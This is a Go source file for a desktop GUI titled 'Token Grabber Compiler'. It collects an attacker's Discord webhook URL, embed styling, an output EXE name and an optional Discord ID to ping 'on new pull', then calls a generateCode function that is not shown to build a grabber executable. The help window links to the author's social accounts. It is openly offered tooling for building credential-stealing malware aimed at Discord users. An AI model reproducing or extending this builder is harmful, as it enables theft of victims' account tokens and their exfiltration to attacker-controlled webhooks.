package main

import (
	"fmt"
	"image/color"
	"net/url"

	"fyne.io/fyne"

	"fyne.io/fyne/app"
	"fyne.io/fyne/canvas"
	"fyne.io/fyne/layout"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"
)

func main() {
	a := app.New()
	win := a.NewWindow("Token Grabber Compiler")
	win.Resize(fyne.NewSize(500, 400))
	win.CenterOnScreen()

	toolbar := widget.NewToolbar(
		widget.NewToolbarAction(theme.HelpIcon(), func() {
			go showHelpPage(a)
		}),
	)

	webhookEntryLabel := canvas.NewText("Webhook URL:", color.RGBA{239, 76, 63, 100})
	webhookEntryLabel.Alignment = fyne.TextAlignCenter
	webhookEntryLabel.TextStyle.Bold = true

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Webhook URL")

	webhookScrollBar := widget.NewHScrollContainer(webhookEntry)

	webhookAvatarLabel := canvas.NewText("Webhook Avatar Photo:", color.White)
	webhookAvatarLabel.Alignment = fyne.TextAlignCenter
	webhookAvatarLabel.TextStyle.Bold = true

	webhookAvatarEntry := widget.NewEntry()
	webhookAvatarEntry.SetPlaceHolder("Webhook Avatar URL")

	webhookAvatarScrollBar := widget.NewHScrollContainer(webhookAvatarEntry)

	embedEntryLabel := canvas.NewText("Embed Color HEX:", color.White)
	embedEntryLabel.Alignment = fyne.TextAlignCenter
	embedEntryLabel.TextStyle.Bold = true

	embedColorEntry := widget.NewEntry()
	embedColorEntry.SetPlaceHolder("#0099e1")

	fileNameLabel := canvas.NewText("EXE Output Name:", color.White)
	fileNameLabel.Alignment = fyne.TextAlignCenter
	fileNameLabel.TextStyle.Bold = true

	fileNameEntry := widget.NewEntry()
	fileNameEntry.SetPlaceHolder("grabber.exe")

	pingLabel := canvas.NewText("Input Your Discord ID", color.White)
	pingLabel.Alignment = fyne.TextAlignCenter
	pingLabel.TextStyle.Bold = true
	pingLabel.Hide()

	discordIDEntry := widget.NewEntry()
	discordIDEntry.SetPlaceHolder("753296054480273568")
	discordIDEntry.Hide()
	ping := fyne.NewContainerWithLayout(layout.NewHBoxLayout(), widget.NewCheck("Ping On New Pull?", func(checked bool) {
		if checked {
			pingLabel.Show()
			discordIDEntry.Show()
		} else {
			pingLabel.Hide()
			discordIDEntry.Hide()
		}
	}), discordIDEntry)
	ping = fyne.NewContainerWithLayout(layout.NewCenterLayout(), ping)

	infoLabel := widget.NewLabel("")
	infoLabel.Hide()

	errorLabel := canvas.NewText("You Cannot Leave Webhook URL Empty!", color.RGBA{239, 76, 63, 100})
	errorLabel.TextStyle.Bold = true
	errorLabel.Hide()

	entryLayout := fyne.NewContainerWithLayout(layout.NewVBoxLayout(), webhookEntryLabel, webhookScrollBar, webhookAvatarLabel, webhookAvatarScrollBar, embedEntryLabel, embedColorEntry, fileNameLabel, fileNameEntry, pingLabel, ping)

	informationLabels := fyne.NewContainerWithLayout(layout.NewCenterLayout(), infoLabel, errorLabel)

	compileButton := widget.NewButton("Compile", func() {
		if webhookEntry.Text == "" {
			errorLabel.Show()
		} else {
			errorLabel.Hide()
			generateCode(webhookEntry.Text, webhookAvatarEntry.Text, embedColorEntry.Text, fileNameEntry.Text, discordIDEntry.Text)
			infoLabel.SetText("Program Has Been Compiled With Your Webhook!")
			infoLabel.Show()
		}
	})

	quitButton := widget.NewButton("Quit", func() {
		a.Quit()
	})

	buttons := fyne.NewContainerWithLayout(layout.NewHBoxLayout(), layout.NewSpacer(), compileButton, quitButton, layout.NewSpacer())

	redImg := &canvas.Image{
		Resource: resourceRedPng,
		FillMode: canvas.ImageFillOriginal,
	}
	redLabel := canvas.NewText("Red Text = Required", color.White)
	redLabel.Alignment = fyne.TextAlignLeading

	red := fyne.NewContainerWithLayout(layout.NewHBoxLayout(), redImg, redLabel)
	red = fyne.NewContainerWithLayout(layout.NewCenterLayout(), red)

	whiteImg := &canvas.Image{
		Resource: resourceWhitePng,
		FillMode: canvas.ImageFillOriginal,
	}
	whiteLabel := canvas.NewText("White Text = Optional", color.White)
	whiteLabel.Alignment = fyne.TextAlignLeading

	white := fyne.NewContainerWithLayout(layout.NewHBoxLayout(), whiteImg, whiteLabel)
	white = fyne.NewContainerWithLayout(layout.NewCenterLayout(), white)

	helpLayout := fyne.NewContainerWithLayout(layout.NewVBoxLayout(), red, white)

	win.SetContent(fyne.NewContainerWithLayout(layout.NewVBoxLayout(), toolbar, entryLayout, informationLabels, buttons, helpLayout))
	win.ShowAndRun()
}

func parseURL(urlStr string) *url.URL {
	u, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println(err)
	}
	return u
}

func showHelpPage(a fyne.App) {
	win := a.NewWindow("About Page")
	win.Resize(fyne.NewSize(250, 200))
	win.CenterOnScreen()
	titleLabel := widget.NewLabelWithStyle("Social Medias", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	githubLink := widget.NewHyperlinkWithStyle("Github Link", parseURL("https://github.com/rustybalboadev"), fyne.TextAlignCenter, fyne.TextStyle{})
	twitterLink := widget.NewHyperlinkWithStyle("Twitter Link", parseURL("https://twitter.com/rustybalboadev"), fyne.TextAlignCenter, fyne.TextStyle{})
	rustyWeb := widget.NewHyperlinkWithStyle("rustybalboa.dev", parseURL("https://rustybalboa.dev"), fyne.TextAlignCenter, fyne.TextStyle{})
	yoinkWeb := widget.NewHyperlinkWithStyle("yoink.rip", parseURL("https://yoink.rip"), fyne.TextAlignCenter, fyne.TextStyle{})
	discordLabel := widget.NewLabelWithStyle("Rusty_Balboa#6660", fyne.TextAlignCenter, fyne.TextStyle{})
	socials := fyne.NewContainerWithLayout(layout.NewVBoxLayout(), titleLabel, githubLink, twitterLink, rustyWeb, yoinkWeb, discordLabel)

	centerContainer := fyne.NewContainerWithLayout(layout.NewCenterLayout(), socials)
	win.SetContent(centerContainer)
	win.Show()
}
